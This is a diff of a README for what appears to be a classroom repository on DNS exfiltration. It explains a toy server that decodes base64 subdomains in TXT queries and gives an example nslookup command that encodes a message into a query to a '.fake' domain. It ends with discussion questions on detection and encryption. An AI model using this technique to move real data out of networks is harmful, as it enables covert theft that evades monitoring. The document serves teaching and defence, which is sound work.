@@ -1,19 +1,32 @@
 # DNSexfil
-Simple hello exchange to start DNS based exfil
+This repo supports the begins of a classroom discussion about DNS exfiltration.
 
-This repo supports teaching how DNS can be used to exfilrate information.  The "hello" returns the IP address the client would connect with.  It is a student effort to modify the server to handle a proper exfilration.
+The "hello" returns the decoded message sent in a DNS query, along with the IP address the client would connect with.  It is a student effort to modify the server to handle a proper exfiltration.
 
-dns_exfil_server.py as is responses only to requests for 'RXhmaWwgaGVsbG8.fake'. Returing fake IP4 and IP6 addresses.  'RXhmaWwgaGVsbG8' is just 'Exfil hello' base64 urlencoded.  
+dns_exfil_server.py as is responses only to TXT queries. The first subdomain is assumed to be a base64 URL encoded message.
 
-dns_exfil_client.py as is just says hello.  A real world client would shift to a second level after hello.
+Example, assuming dns_exfil_server.py is running locally: 
+```
+nslookup -q=txt VGhpcyBpcyBteSBtZXNzYWdlIHRvIHRoZSBzZXJ2ZXIsIHlvdXIgc2VydmFudA.fake 127.0.0.1
+DNS request timed out.
+    timeout was 2 seconds.
+Server:  UnKnown
+Address:  127.0.0.1
+
+VGhpcyBpcyBteSBtZXNzYWdlIHRvIHRoZSBzZXJ2ZXIsIHlvdXIgc2VydmFudA.fake     text =
+
+        "This is my message to the server, your servant. Server reply: connect to 11.22.33.44:5678"
+```
 
 Student discussion  
 - How much data can be sent in a single DNS query?
-- How would the affected site discover the exfilration?
-- Should the client after the hello exchange shift to HTTPS?
-- Would a DNS server discover the exfilration?
-- Would a network firewall discover the exfilration?
-- Would a DLP solution discover the exfilration?
+- How would the affected site discover the exfiltration?
+- Should the client after the hello exchange, shift to HTTPS?
+- Would a DNS server discover the exfiltration?
+- Would a network firewall discover the exfiltration?
+- Would a DLP solution discover the exfiltration?
 - What happens to the exfilration if a UDP packet fails?
 - Is adding encryption needed?
 - How would you add encryption?
+- Does the exfiltration care about losing UDP packets?
+- What advantages/disadvantages does DNS over HTTPS (DoH) provide?
